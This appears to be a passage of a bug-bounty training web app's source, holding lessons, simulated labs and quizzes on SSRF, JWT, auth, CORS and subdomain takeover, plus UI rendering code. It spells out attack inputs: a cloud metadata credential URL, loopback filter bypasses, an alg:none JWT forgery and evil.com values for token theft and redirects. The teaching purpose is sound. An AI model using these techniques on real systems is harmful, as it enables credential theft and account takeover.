    <div class="note"><span class="nt">Mentor note</span><p>Modern ORMs and prepared statements killed most easy SQLi, so it's less common on mature targets — but it still lurks in legacy endpoints, search/filter/sort params, and custom raw queries. When you <em>do</em> find it, it's a near-guaranteed Critical. Worth knowing cold.</p></div>`},
  {id:"5.2",type:"lab",title:"Lab: bypass login & dump the table",lab:"sqli",html:`
    <p>Two-stage simulated SQLi target. <strong>Stage 1:</strong> the login builds <code>SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'</code> by raw concatenation — bypass it to log in as admin. <strong>Stage 2:</strong> the product search reflects rows and is <code>UNION</code>-injectable — extract the hidden <code>secrets</code> table. The flag is in there.</p>
    <p><strong>Goal:</strong> complete either stage to reveal the flag (the query builds live so you can see your injection take shape).</p>`},
  {id:"5.3",type:"quiz",title:"Checkpoint: SQLi",quiz:[
    {q:"The single best real-world defense against SQL injection is:",opts:["Blocking the word SELECT","Parameterized queries / prepared statements","Hiding error messages"],a:1,ex:"Parameterization separates code from data so input can never become SQL. Filtering keywords is bypassable and fragile."},
    {q:"The results aren't displayed, but adding '; SELECT SLEEP(5)-- makes the page hang 5 seconds. This is:",opts:["A caching issue","Time-based blind SQL injection","A network glitch"],a:1,ex:"Controllable, conditional delay = time-based blind SQLi. You extract data one yes/no question at a time."},
    {q:"Why is a confirmed SQLi almost always a high-value bounty?",opts:["It's rare and funny","It can read/modify the entire database — often Critical impact","It only changes the UI"],a:1,ex:"Direct database access means mass data exposure or tampering — top-tier impact, top-tier payout."}
  ]}
]},

{code:"MOD_06",title:"SSRF & Server-Side",blurb:"Make the server make requests for you — into its own private network and cloud metadata.",lessons:[
  {id:"6.1",type:"theory",title:"Server-Side Request Forgery",html:`
    <p><span class="sev high">High</span>–<span class="sev crit">Critical</span> SSRF is when you control a URL that the <em>server</em> fetches. The server sits inside a trusted network you can't reach — so you borrow its position to reach internal services, cloud metadata, and localhost admin panels.</p>
    <h3>Where SSRF lives</h3>
    <ul>
      <li>"Fetch URL" features: website screenshotters, PDF generators, link previews, webhook test buttons.</li>
      <li>Any parameter that takes a URL: <code>?url=</code>, <code>?image=</code>, <code>?callback=</code>, <code>?feed=</code>.</li>
      <li>XML parsers (XXE), and file imports "from a URL".</li>
    </ul>
    <h3>The crown jewel: cloud metadata</h3>
    <p>Cloud VMs expose a magic internal IP, <code>169.254.169.254</code>, serving instance metadata — often including <strong>temporary cloud credentials</strong>. An SSRF that reaches it can hand you keys to the whole cloud account:</p>
    <pre><code><span class="kw">GET</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
    <h3>Filter bypasses</h3>
    <p>Apps try to block internal targets with naive filters. You defeat them:</p>
    <ul>
      <li>Blocked <code>localhost</code>/<code>127.0.0.1</code>? Use <code>127.1</code>, <code>0.0.0.0</code>, <code>[::1]</code>, decimal <code>2130706433</code>, or <code>127.0.0.1.nip.io</code>.</li>
      <li>Redirects: point to your own server that <code>302</code>-redirects to the internal target.</li>
      <li>Alternate schemes: <code>file://</code>, <code>gopher://</code>, <code>dict://</code> for deeper exploitation.</li>
    </ul>
    <div class="note"><span class="nt">Mentor note</span><p>Even a "blind" SSRF (no response shown) is reportable — prove it by making the server hit a Burp Collaborator / your own listener and showing the callback. DNS/HTTP interaction from the target's IP is solid evidence.</p></div>`},
  {id:"6.2",type:"lab",title:"Lab: bypass the SSRF filter",lab:"ssrf",html:`
    <p>This simulated "URL preview" service fetches any URL you give it — except it has a lazy blocklist that rejects the literal strings <code>localhost</code> and <code>127.0.0.1</code>. Two internal services exist that you shouldn't be able to reach: a <strong>localhost admin panel</strong> and the <strong>cloud metadata endpoint</strong>. Reach either one to capture the flag.</p>
    <p><strong>Goal:</strong> craft a URL that slips past the filter and hits an internal service. Think about all the ways to write "localhost" — and remember the metadata IP isn't in their blocklist at all.</p>`},
  {id:"6.3",type:"quiz",title:"Checkpoint: SSRF",quiz:[
    {q:"A 'screenshot this URL' feature blocks 127.0.0.1. How do you still reach localhost?",opts:["You can't once it's blocked","Alternate encodings: 127.1, [::1], 0.0.0.0, decimal 2130706433","Only via XSS"],a:1,ex:"Naive string blocklists miss the many equivalent representations of loopback. Encoding tricks defeat them."},
    {q:"Why is 169.254.169.254 a prime SSRF target on cloud-hosted apps?",opts:["It's a public API","It serves instance metadata, often including temporary cloud credentials","It's the DNS server"],a:1,ex:"The cloud metadata service can leak IAM credentials, turning an SSRF into full cloud-account compromise."},
    {q:"The response is never shown back to you (blind SSRF). Can you still report it?",opts:["No, you need to see output","Yes — prove it with an out-of-band callback (Collaborator/your listener)","Only if it's GET"],a:1,ex:"An out-of-band interaction from the target's infrastructure is valid proof of blind SSRF."}
  ]}
]},

{code:"MOD_07",title:"Auth & Business Logic",blurb:"The creative bugs scanners can't find: broken auth, token forging, and logic you can abuse for profit.",lessons:[
  {id:"7.1",type:"theory",title:"Breaking authentication",html:`
    <p><span class="sev high">High</span>–<span class="sev crit">Critical</span> Auth bugs mean becoming another user — the holy grail. They're logic flaws, so automated tools miss them and competition is lower.</p>
    <h3>Password reset — a goldmine</h3>
    <ul>
      <li><strong>Host header poisoning:</strong> the reset link is built from the <code>Host</code> header. Change it to your domain and the victim's reset token lands on <em>your</em> server.</li>
      <li><strong>Token leakage / weakness:</strong> predictable tokens, tokens that don't expire, or tokens returned in the response body.</li>
      <li><strong>Response manipulation:</strong> a reset/verify step that trusts a client-controlled email or user ID.</li>
    </ul>
    <h3>2FA / OTP bypasses</h3>
    <ul>
      <li>No rate limit on the OTP → brute-force the 6 digits.</li>
      <li>The "2FA required" flag enforced only client-side → skip straight to the authenticated endpoint.</li>
      <li>OTP reused across accounts, or the verify response leaks the code.</li>
    </ul>
    <h3>JWT (JSON Web Token) attacks</h3>
    <p>JWTs are client-held tokens of the form <code>header.payload.signature</code>, base64url-encoded. Classic flaws:</p>
    <ul>
      <li><strong><code>alg: none</code></strong> — tell the server the token is unsigned; if it obeys, you forge any identity.</li>
      <li><strong>Weak secret</strong> — crack an <code>HS256</code> secret offline, then sign your own admin token.</li>
      <li><strong>Algorithm confusion</strong> — trick an <code>RS256</code> verifier into treating the public key as an <code>HS256</code> secret.</li>
    </ul>
    <div class="note warn"><span class="nt">Test ethically</span><p>Use accounts you own. "Take over" your own second account to prove the flaw. Never actually seize a real user's account, even to demonstrate — the PoC with your own accounts is enough for triage.</p></div>`},
  {id:"7.2",type:"theory",title:"Business logic & race conditions",html:`
    <p>Business logic flaws are where the app does exactly what it was coded to do — but the logic itself is exploitable. No "vulnerability" in the classic sense, pure creativity. These are often the best-paid beginner bugs because they're invisible to tools.</p>
    <h3>Patterns to hunt</h3>
    <ul>
      <li><strong>Negative/overflow values:</strong> quantity <code>-1</code> that credits your balance; a huge number that overflows.</li>
      <li><strong>Price/parameter tampering:</strong> the price or discount sent from the client (you tampered exactly this in Module 1).</li>
      <li><strong>Coupon / referral abuse:</strong> stacking, reusing one-time codes, self-referral loops for credit.</li>
      <li><strong>Skipping steps:</strong> jumping straight to the "order confirmed" endpoint without paying.</li>
      <li><strong>State confusion:</strong> cancel-then-refund timing, changing an order after it's locked.</li>
    </ul>
    <h3>Race conditions</h3>
    <p>Send many requests <em>simultaneously</em> to hit a window between check and action. Redeem one gift card 50 times at once; withdraw the same balance twice before it updates. Burp's "turbo intruder" or parallel requests exploit the gap. Increasingly well-paid as apps scale.</p>
    <div class="note money"><span class="nt">Where the creative money is</span><p>Logic bugs reward understanding the <em>business</em>, not just the tech. Read how a feature is <em>supposed</em> to make the company money, then ask "how do I get that value without paying?" Payment, subscription, and referral flows are rich veins.</p></div>`},
  {id:"7.3",type:"ctf",title:"CTF: forge a JWT",lab:"jwt",flag:"",html:`
    <p>The app authenticates you with this JWT. It's three base64url parts: <code>header.payload.signature</code>. The server has a dangerous bug — it accepts tokens with <code>"alg":"none"</code> and skips signature verification entirely.</p>
    <pre><code><span class="hl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span class="hl">eyJ1aWQiOjEwMjQsInJvbGUiOiJ1c2VyIn0</span>.c2lnbmF0dXJl</code></pre>
    <p><strong>Forge an admin token:</strong> set the header's <code>alg</code> to <code>none</code>, set the payload's <code>role</code> to <code>admin</code>, and drop the signature (leave it empty after the final dot). Submit your forged <code>header.payload.</code> token below. The simulated server accepts it only if the header says <code>alg:none</code> and the payload is valid JSON with <code>role:admin</code>. The lab gives you a JWT decoder/encoder.</p>`},
  {id:"7.5",type:"lab",title:"Lab: CSRF — forge a state change",lab:"csrf",html:`
    <p><span class="sev med">Medium</span>–<span class="sev high">High</span> Cross-Site Request Forgery tricks a logged-in victim's browser into sending a state-changing request to a site they're authenticated on. The browser attaches the session cookie <em>automatically</em>, so if the server only checks "is there a valid session?" and not "did this request originate from our own page?" (a CSRF token), any website can act as the victim.</p>
    <p>Below is a vulnerable "account settings" endpoint that changes your email. It has no CSRF token. Open the simulated attacker page and watch it silently change the victim's email — then flip on token protection and see the attack fail.</p>`},
  {id:"7.6",type:"lab",title:"Lab: race condition",lab:"race",html:`
    <p><span class="sev high">High</span> A race condition exploits the tiny window between a <em>check</em> and the <em>action</em>. Send many identical requests at the exact same instant and they all pass the check (e.g. "is this gift card unused?") before any of them writes the result. One-time things happen many times. These are increasingly well-paid as apps scale.</p>
    <p>Below is a €100 gift card that should only redeem once. Redeem it normally and it locks. Then fire a burst of simultaneous requests and beat the lock.</p>`},
  {id:"7.4",type:"quiz",title:"Checkpoint: auth & logic",quiz:[
    {q:"A password reset link is built using the Host header of your request. You change it to evil.com. What happens?",opts:["Nothing, Host is server-controlled","The victim's reset token may be sent to a link on your domain — account takeover","The site crashes"],a:1,ex:"Host header poisoning in reset flows can route the victim's token to an attacker-controlled domain. High impact."},
    {q:"A JWT's header says alg:none and the server accepts it. Why is that critical?",opts:["It's faster","No signature is verified, so you can forge any identity/role","It encrypts better"],a:1,ex:"alg:none means the server trusts an unsigned token — forge the payload and become anyone, including admin."},
    {q:"You can redeem a single-use gift card multiple times by sending requests simultaneously. This is a:",opts:["Caching bug","Race condition in business logic","XSS"],a:1,ex:"Concurrent requests hitting the check-then-update window is a classic, well-paid race condition."}
  ]}
]},

{code:"MOD_08",title:"The Beginner Moneymakers",blurb:"The unglamorous, high-frequency bugs that actually pay your first consistent months.",lessons:[
  {id:"8.1",type:"theory",title:"Bread-and-butter bugs",html:`
    <p>These rarely make headlines, but they're common, quick to find, and reliably payable — the backbone of a €400–600 month. Learn to spot each in seconds.</p>
    <h4>Subdomain takeover <span class="sev med">Med</span>–<span class="sev high">High</span></h4>
    <p>A DNS record (<code>blog.example.com</code>) still points to a de-provisioned service (S3 bucket, Heroku app, GitHub Pages). You register that service name yourself and now control content on their subdomain. Found via recon + checking for tell-tale "NoSuchBucket" / "there's nothing here yet" pages.</p>
    <h4>CORS misconfiguration <span class="sev med">Med</span></h4>
    <p>Server reflects any <code>Origin</code> with <code>Access-Control-Allow-Credentials: true</code> → any site can read a logged-in user's private data. Test by sending <code>Origin: https://evil.com</code> and checking if it's echoed back.</p>
    <h4>Open redirect <span class="sev low">Low</span>–<span class="sev med">Med</span></h4>
    <p><code>?redirect=https://evil.com</code> sends users off-site. Low alone, but a strong chain link — boosts SSRF, OAuth token theft, and phishing. Report with a chain for real money.</p>
    <h4>Information disclosure <span class="sev low">Low</span>–<span class="sev high">High</span></h4>
    <p>Exposed <code>/.git</code>, <code>.env</code> files, API keys in JS, verbose stack traces, directory listings, debug endpoints. Severity scales with <em>what</em> leaks — a leaked live API key can be High/Critical.</p>
    <h4>Exposed secrets & misconfig <span class="sev varies">varies</span></h4>
    <p>Public cloud storage, unauthenticated admin/monitoring dashboards (Grafana, Kibana, Jenkins), default credentials, Swagger/API docs left open. <code>nuclei</code> templates catch many of these fast.</p>
    <div class="note money"><span class="nt">The beginner's portfolio</span><p>Pick <strong>two</strong> of these as your specialty (subdomain takeover + info disclosure is a great low-effort combo) and run them across many programs. Volume of simple, valid bugs builds the reputation that unlocks private, higher-paying invites.</p></div>`},
  {id:"8.2",type:"ctf",title:"CTF: the leaked config",lab:"secret",flag:"RkxBR3tleHBvc2VkX2Vudl9maWxlc19hcmVfZnJlZV9tb25leX0=",html:`
    <p>During recon you hit <code>https://target.example.com/.env</code> and the server happily returned it (a devastatingly common info-disclosure bug). Here's the file — find the flag hidden among the leaked secrets. One value is base64-encoded; decode it to get the flag.</p>
    <pre><code><span class="cmt"># .env — PUBLICLY EXPOSED (this is the bug)</span>
APP_ENV=production
DB_HOST=10.0.3.14
DB_USER=app_rw
DB_PASS=S3cr3t_Pr0d_Passw0rd!
AWS_ACCESS_KEY_ID=AKIA................
MAIL_DRIVER=smtp
<span class="cmt"># legacy — remove</span>
LEGACY_EXPORT_TOKEN=<span class="hl">RkxBR3tleHBvc2VkX2Vudl9maWxlc19hcmVfZnJlZV9tb25leX0=</span></code></pre>
    <p><strong>Task:</strong> decode <code>LEGACY_EXPORT_TOKEN</code> and submit the flag. (Decoder in the lab below.)</p>`},
  {id:"8.4",type:"lab",title:"Lab: CORS misconfiguration",lab:"cors",html:`
    <p><span class="sev med">Medium</span> When an API reflects <em>any</em> <code>Origin</code> back in <code>Access-Control-Allow-Origin</code> and also sends <code>Access-Control-Allow-Credentials: true</code>, any website a victim visits can make authenticated requests to that API and <strong>read the response</strong> — stealing private data cross-origin. It's a quick, common, payable find.</p>
    <p>Below, probe the API with different <code>Origin</code> values. Find out whether it safely restricts origins or blindly reflects yours.</p>`},
  {id:"8.5",type:"lab",title:"Lab: subdomain takeover",lab:"takeover",html:`
    <p><span class="sev med">Medium</span>–<span class="sev high">High</span> A subdomain takeover happens when a DNS record still points (via CNAME) to a third-party service that's been de-provisioned. Register that service name yourself and you control content on the company's subdomain — perfect for convincing phishing or cookie theft. You find these in recon by matching the response to a known "unclaimed" fingerprint.</p>
    <p>Below is your recon output: several subdomains, their CNAME targets, and the body each returned. <strong>Identify a subdomain that's vulnerable to takeover</strong> by spotting the dangling-service fingerprint.</p>`},
  {id:"8.3",type:"quiz",title:"Checkpoint: moneymakers",quiz:[
    {q:"A subdomain points (CNAME) to an S3 bucket that returns 'NoSuchBucket'. What's the opportunity?",opts:["Nothing","Subdomain takeover — register that bucket name and control the subdomain","A DNS outage to report"],a:1,ex:"A dangling DNS record to an unclaimed service lets you claim it and serve content on their subdomain."},
    {q:"Open redirect alone is often Low. How do you make it pay more?",opts:["Report 50 of them","Chain it — OAuth token theft, SSRF boost, convincing phishing","Add XSS to the URL bar"],a:1,ex:"Open redirects shine as chain components. Demonstrate a real attack chain to raise severity and payout."},
    {q:"The smartest early strategy for consistent income is to:",opts:["Master every bug class before reporting","Specialize in 2 high-frequency bug types and run them across many programs","Only hunt one program forever"],a:1,ex:"Depth in a couple of common bugs + breadth across programs = steady valid findings and a rising reputation score."}
  ]}
]},

{code:"MOD_09",title:"Get Paid: Reporting & The Grind",blurb:"A great bug with a bad report earns nothing. Here's how to get triaged fast, paid fairly, and invited privately.",lessons:[
  {id:"9.1",type:"theory",title:"Writing a report that gets paid",html:`
    <p>Triagers read hundreds of reports. Yours must let them reproduce the bug in under two minutes and immediately grasp the impact. A clear report on a medium bug beats a confusing report on a high one.</p>
    <h3>The anatomy of a paid report</h3>
    <ul>
      <li><strong>Title:</strong> <code>[Bug type] on [endpoint] leading to [impact]</code>. E.g. "IDOR on /api/invoice allows reading any user's invoices."</li>
      <li><strong>Summary:</strong> two sentences — what it is and why it matters.</li>
      <li><strong>Steps to reproduce:</strong> numbered, exact, copy-pasteable. Include the full request. Assume they know nothing about your setup.</li>
      <li><strong>Proof of Concept:</strong> screenshots/video showing it working. For IDOR, show account A reading account B's data (both yours).</li>
      <li><strong>Impact:</strong> spell out what an attacker gains, in business terms. This drives the payout.</li>
      <li><strong>Remediation:</strong> a line on the fix (parameterize the query, add an authorization check). Shows maturity; triagers remember helpful hunters.</li>
    </ul>
    <h3>Severity & CVSS</h3>
    <p>Programs use CVSS to set payouts. Learn to score honestly — inflating severity burns trust, under-scoring costs you money. Key factors: does it need auth? User interaction? What's the scope of data affected? Be able to defend your score.</p>
    <div class="note"><span class="nt">Mentor note</span><p>Your SOC background is a secret weapon here: you already think in terms of impact, detection, and clear incident write-ups. Lean into it — your reports can be noticeably more professional than the average hunter's from day one.</p></div>`},
  {id:"9.2",type:"theory",title:"The sustainable grind to €400–600",html:`
    <p>Now we assemble everything into a machine that produces consistent income. This is the lesson to re-read monthly.</p>
    <h3>Program selection (the biggest lever)</h3>
    <ul>
      <li><strong>Avoid the mega-programs</strong> (Google, Meta, PayPal) early — saturated, everything's found, endless duplicates.</li>
      <li><strong>Favor newly-launched programs</strong> — fresh scope, fewer hunters. Watch platform "new program" feeds.</li>
      <li><strong>Favor responsive programs</strong> — platforms show average response/resolution time and payout speed. Slow programs waste your time and cashflow.</li>
      <li><strong>EU-friendly platforms</strong> — <strong>Intigriti</strong> and <strong>YesWeHack</strong> are European, with many EU company programs and often less US-hunter saturation; good fit from Greece. Use <strong>HackerOne</strong> and <strong>Bugcrowd</strong> too for volume.</li>
    </ul>
    <h3>The reputation flywheel</h3>
    <p>Valid reports raise your reputation/signal score → you get <strong>private program invites</strong>. Private programs have far less competition and better payouts. This is where most consistent income actually comes from. Early VDPs (no bounty, reputation only) are worth it purely to spin up this flywheel.</p>
    <h3>The monthly scorecard</h3>
    <table class="money-tbl">
      <tr><th>Track monthly</th><th>Healthy signal</th></tr>
      <tr><td>Reports submitted</td><td>8–20 (quality-gated)</td></tr>
      <tr><td>Valid rate</td><td>climbing past ~30%+</td></tr>
      <tr><td>Private invites</td><td>trending up</td></tr>
      <tr><td>3-month avg income</td><td>the only number that matters</td></tr>
    </table>
    <div class="note money"><span class="nt">The honest bottom line</span><p>€400–600/month is a <strong>skill plateau you climb to</strong>, not a switch you flip. Specialize, pick good programs, write clean reports, survive the duplicate valley, and judge yourself on quarterly averages. With your background and a steady 12 hrs/week, it's a realistic 6–12 month target — and once you're there, the next plateau (€1–2k) uses the exact same machine.</p></div>`},
  {id:"9.3",type:"theory",title:"Graduation: your next 90 days",html:`
    <p>You've got the mental models and the mechanics. Here's the concrete plan to turn First Bounty into real findings — on <strong>authorized, in-scope</strong> targets only.</p>
    <h3>Days 1–30: build reps safely</h3>
    <ul>
      <li>Finish every lab and CTF here until the mechanics are automatic.</li>
      <li>Do <strong>PortSwigger Web Security Academy</strong> (free, legal, the gold standard) — all the Apprentice labs in Access Control, XSS, and SQLi. It's the perfect next step beyond these simulations.</li>
      <li>Wire up Burp + Firefox + your recon CLI. Capture and read traffic on sites you own or on deliberately-vulnerable practice apps (OWASP Juice Shop, DVWA).</li>
    </ul>
    <h3>Days 31–60: first real recon</h3>
    <ul>
      <li>Pick <strong>one</strong> wide-scope, responsive program with safe harbor on Intigriti/YesWeHack/HackerOne.</li>
      <li>Spend the whole time on recon + reading JS. Build your target map. Don't rush to exploit.</li>
      <li>Hunt your two chosen specialties (suggested: IDOR + info disclosure) across the mapped surface.</li>
    </ul>
    <h3>Days 61–90: submit & iterate</h3>
    <ul>
      <li>Submit your first reports — clean, impactful, honest severity. Expect duplicates; don't be discouraged.</li>
      <li>Review every rejection: why was it a dupe/N/A? Adjust program choice and depth.</li>
      <li>Join the community (hunter Discords, writeups, X/Twitter infosec). Read disclosed reports on HackerOne Hacktivity daily — it's the best free masterclass there is.</li>
    </ul>
    <div class="note warn"><span class="nt">One last time, because it matters</span><p>Everything you practiced here was a safe simulation. The moment you touch a real system, you must have a <strong>written invitation</strong> and stay <strong>strictly in scope</strong>. That discipline is what separates a paid researcher from a defendant. Now go earn it — ethically. Καλή επιτυχία, Σταύρο.</p></div>`}
]}
];

/* ============================================================
   DERIVED STATE
   ============================================================ */
function modCode(mi){return "MOD_"+String(mi).padStart(2,"0");}
const ALL=[];COURSE.forEach((m,mi)=>m.lessons.forEach((l,li)=>{l._m=mi;l._mi=li;l._mc=modCode(mi);l._mt=m.title;ALL.push(l);}));
function lessonXP(l){return XP[l.type]||10;}
function totalXP(){return ALL.reduce((s,l)=>s+(done.has(l.id)?lessonXP(l):0),0);}
function maxXP(){return ALL.reduce((s,l)=>s+lessonXP(l),0);}
function pct(){return Math.round(done.size/ALL.length*100);}
function modPct(mi){const ls=COURSE[mi].lessons;const d=ls.filter(l=>done.has(l.id)).length;return Math.round(d/ls.length*100);}
function rankName(){const p=pct();let r=RANKS[0][1];for(const[t,n]of RANKS)if(p>=t)r=n;return r;}
function solvedCount(){return [...done].filter(id=>{const l=ALL.find(x=>x.id===id);return l&&(l.type==='lab'||l.type==='ctf');}).length;}
function labTotal(){return ALL.filter(l=>l.type==='lab'||l.type==='ctf').length;}
function shareText(){
  const h=getHandle();const who=h?('@'+h):'I';const verb=h?' is':"'m";
  const cert=capPassed()?' (Certified Hunter ✓)':'';
  return who+verb+' learning bug bounty on First Bounty'+cert+' — '+pct()+'% complete, rank "'+rankName()+'", '+done.size+' lessons done and '+solvedCount()+'/'+labTotal()+' labs & CTFs solved. Ethical, hands-on, networking fundamentals → your first bounty.';
}

/* ============================================================
   RENDER: header stats
   ============================================================ */
function renderStats(){
  $("#xpLabel").textContent=totalXP()+" XP";
  $("#rankLabel").textContent=rankName();
  $("#pbarFill").style.width=pct()+"%";
}

/* ============================================================
   RENDER: sidebar
   ============================================================ */
let currentLesson=null;
let currentView="home";
function ringSVG(p,size=26,done=false){
  const r=(size-3)/2,c=2*Math.PI*r,off=c*(1-p/100);
  return `<svg class="ring ${p>=100?'done':''}" width="${size}" height="${size}" viewBox="0 0 ${size} ${size}">
    <circle class="bg" cx="${size/2}" cy="${size/2}" r="${r}"/>
    <circle class="fg" cx="${size/2}" cy="${size/2}" r="${r}" stroke-dasharray="${c.toFixed(1)}" stroke-dashoffset="${off.toFixed(1)}"/>
  </svg>`;
}
function renderSidebar(){
  const a=$("#sidebar");a.innerHTML="";
  const home=el("button","nav-home",t("nav.home"));
  home.onclick=()=>showTool('home');
  a.appendChild(home);
  const tools=el("div","toolnav");
  tools.appendChild(el("div","toolnav-label",esc(t("nav.tools"))));
  [['manual','⌗',"nav.manual"],['arsenal','⚑',"nav.arsenal"],['report','✎',"nav.report"],['tracker','€',"nav.tracker"],['capstone','✦',"nav.capstone"],['certificate','◈',"nav.cert"]].forEach(([v,ic,key])=>{
    const b=el("button","toolbtn");b.dataset.view=v;
    b.innerHTML='<span class="ti">'+ic+'</span>'+esc(t(key));
    b.onclick=()=>showTool(v);
    tools.appendChild(b);
  });
  a.appendChild(tools);
  a.appendChild(el("div","side-sep",esc(t("nav.curriculum"))));
  COURSE.forEach((m,mi)=>{
    const wrap=el("div","mod");wrap.dataset.mi=mi;
    if(m._open)wrap.classList.add("open");
    const head=el("button","mod-head");
    head.innerHTML=`<span class="mod-ring">${ringSVG(modPct(mi))}</span>
      <span class="mod-code">${modCode(mi)}</span>
      <span class="mod-title">${esc(m.title)}</span>
      <span class="mod-chev">▶</span>`;
    head.onclick=()=>{m._open=!m._open;wrap.classList.toggle("open");};
    wrap.appendChild(head);
    const ul=el("div","lessons");
    m.lessons.forEach(l=>{
      const row=el("button","lrow");row.dataset.lid=l.id;
      if(done.has(l.id))row.classList.add("done");
      row.innerHTML=`<span class="ldot">${done.has(l.id)?'✓':''}</span>
        <span class="lt-type">${l.type}</span>
        <span class="lt-title">${esc(l.title)}</span>`;
      row.onclick=()=>{openLesson(l.id);closeDrawer();};
      ul.appendChild(row);
    });
    wrap.appendChild(ul);
    a.appendChild(wrap);
  });
  syncActive();
}
function syncActive(){
  document.querySelectorAll(".lrow").forEach(r=>r.classList.toggle("active",r.dataset.lid===currentLesson));
  document.querySelectorAll(".lrow").forEach(r=>{
    const l=ALL.find(x=>x.id===r.dataset.lid);
    r.classList.toggle("done",done.has(r.dataset.lid));
    r.querySelector(".ldot").innerHTML=done.has(r.dataset.lid)?'✓':'';
  });
  syncNav();
}
function syncNav(){
  document.querySelectorAll(".toolbtn").forEach(b=>b.classList.toggle("active",currentView===b.dataset.view));
  const h=document.querySelector(".nav-home");if(h)h.classList.toggle("active",currentView==="home");
}
function showTool(name){
  currentLesson=null;currentView=name;closeDrawer();
  if(name==="arsenal")renderArsenal();
  else if(name==="manual")renderFieldManual();
  else if(name==="report")renderReport();
  else if(name==="tracker")renderTracker();
  else if(name==="certificate")renderCertificate();
  else if(name==="capstone")renderCapstone();
  else {currentView="home";renderHome();}
  syncActive();
}

/* ============================================================
   RENDER: home / roadmap
   ============================================================ */
function renderHome(){
  currentView="home";
  const v=$("#view");
  const p=pct();
  const wlPlaceholder=/REPLACE_ME/.test(CONFIG.waitlistUrl);
  const credsHTML=CONFIG.instructor.creds.map(c=>'<span class="spec-chip">'+esc(c)+'</span>').join('');
  const linksHTML=CONFIG.instructor.links.map(([label,url])=>'<a class="about-link" href="'+esc(url)+'" target="_blank" rel="noopener">'+esc(label)+' ↗</a>').join('');
  v.innerHTML=`
    <section class="hero">
      <div class="eyebrow">${t("hero.eyebrow")}</div>
      <h2>${t("hero.h")}</h2>
      <p>${t("hero.p")}</p>
      <div class="cta-row">
        <button class="btn cta-start">${t("cta.start")}</button>
        <button class="btn ghost cta-spec">${t("cta.spec")}</button>
        <button class="btn ghost cta-share">${t("cta.share")}</button>
      </div>
      <div class="stat-row">
        <div class="stat"><div class="n">${ALL.length}</div><div class="l">${t("stat.lessons")}</div></div>
        <div class="stat"><div class="n">${labTotal()}</div><div class="l">${t("stat.labs")}</div></div>
        <div class="stat"><div class="n">${p}%</div><div class="l">${t("stat.complete")}</div></div>
        <div class="stat"><div class="n">${totalXP()}</div><div class="l">${t("stat.xp")}</div></div>
        <div class="stat"><div class="n">${streak.count}</div><div class="l">${t("stat.streak")}</div></div>
        <div class="stat"><div class="n" style="font-size:13px;line-height:1.6">${esc(rankName())}</div><div class="l">${t("stat.rank")}</div></div>
      </div>
    </section>
    <div class="waitlist">
      <div class="wl-text"><h3>${t("wl.title")}</h3><p>${t("wl.body")}</p></div>
      <div class="wl-actions">
        <a class="btn wl-btn" href="${esc(CONFIG.waitlistUrl)}" target="_blank" rel="noopener">${t("wl.btn")}</a>
        ${CONFIG.communityUrl?`<a class="btn ghost" href="${esc(CONFIG.communityUrl)}" target="_blank" rel="noopener">${t("wl.community")}</a>`:''}
        ${wlPlaceholder?`<div class="wl-hint">⚙︎ Set your real link in CONFIG.waitlistUrl (top of the script).</div>`:''}
      </div>
    </div>
    <div class="section-label">${t("how.label")}</div>
    <div class="how-row">
      <div class="how"><span class="how-n">1</span><h4>${t("how.1h")}</h4><p>${t("how.1p")}</p></div>
      <div class="how"><span class="how-n">2</span><h4>${t("how.2h")}</h4><p>${t("how.2p")}</p></div>
      <div class="how"><span class="how-n">3</span><h4>${t("how.3h")}</h4><p>${t("how.3p")}</p></div>
    </div>
    <div id="specPanel"></div>
    <div class="note money"><span class="nt">${t("money.nt")}</span><p>${t("money.body")}</p></div>
    <div class="section-label">${t("sec.roadmap")}</div>
    <div class="road" id="road"></div>
    <div class="section-label">${t("sec.about")}</div>
    <div class="about">
      <div class="about-head"><span class="about-by">${t("ab.by")}</span> <span class="about-name">${esc(CONFIG.instructor.name)}</span></div>
      <div class="about-tag">${esc(instr("tagline"))}</div>
      <div class="about-creds">${credsHTML}</div>
      <p class="about-bio">${esc(instr("bio"))}</p>
      <div class="about-links">${linksHTML}</div>
      <div class="about-disc">${t("ab.disclaimer")}</div>
    </div>
    <footer class="site-foot">
      <div>${t("foot.main")}</div>
      <div class="foot-sub">${t("foot.sub")}</div>
    </footer>
  `;
  const road=$("#road");
  COURSE.forEach((m,mi)=>{
    const card=el("button","road-card");
    card.innerHTML=`<span class="road-num">${modCode(mi).replace('MOD_','')}</span>
      <span class="road-main"><h3>${esc(m.title)}</h3><p>${esc(m.blurb)}</p></span>
      <span class="road-prog">${ringSVG(modPct(mi),40)}</span>`;
    card.onclick=()=>{m._open=true;renderSidebar();openLesson(m.lessons[0].id);};
    road.appendChild(card);
  });
  renderSpecPanel($("#specPanel"));
  const sel=q=>v.querySelector(q);
  sel(".cta-start").onclick=()=>openLesson(COURSE[0].lessons[0].id);
  sel(".cta-spec").onclick=()=>{const sp=$("#specPanel");if(sp)sp.scrollIntoView({behavior:"smooth",block:"start"});};
  const shareBtn=sel(".cta-share");
  shareBtn.onclick=()=>{
    const txt=shareText();
    const ok=()=>{shareBtn.textContent="✓";setTimeout(()=>shareBtn.textContent=t("cta.share"),1600);};
    copyText(txt).then(ok).catch(()=>{try{const ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";document.body.appendChild(ta);ta.select();document.execCommand&&document.execCommand("copy");document.body.removeChild(ta);ok();}catch(e){shareBtn.textContent="Copy from Certificate";}});
  };
  $("#main").scrollTop=0;
}

/* ============================================================
   RENDER: a lesson
   ============================================================ */
function openLesson(id){
  const l=ALL.find(x=>x.id===id);if(!l)return;
  currentLesson=id;currentView="lesson";
  COURSE[l._m]._open=true;
  document.querySelectorAll(".mod").forEach(w=>{if(+w.dataset.mi===l._m)w.classList.add("open");});
  const v=$("#view");
  const typeLabel={theory:t("lt.theory"),lab:t("lt.lab"),ctf:t("lt.ctf"),quiz:t("lt.quiz")}[l.type];
  v.innerHTML=`
    <div class="eyebrow">${l._mc} // ${esc(l._mt)}</div>
    <h2 class="lesson-h">${esc(l.title)}</h2>
    <div class="lesson-sub">${typeLabel} · +${lessonXP(l)} ${t("l.xp")} ${done.has(l.id)?'· <span style="color:var(--ok)">✓ '+esc(t("l.completed"))+'</span>':''}</div>
    <div class="content" id="lessonContent"></div>
  `;
  const c=$("#lessonContent");
  if(LANG==="gr")c.appendChild(el("div","en-note",esc(t("l.enLessons"))));
  if(l.html)c.insertAdjacentHTML("beforeend",l.html);
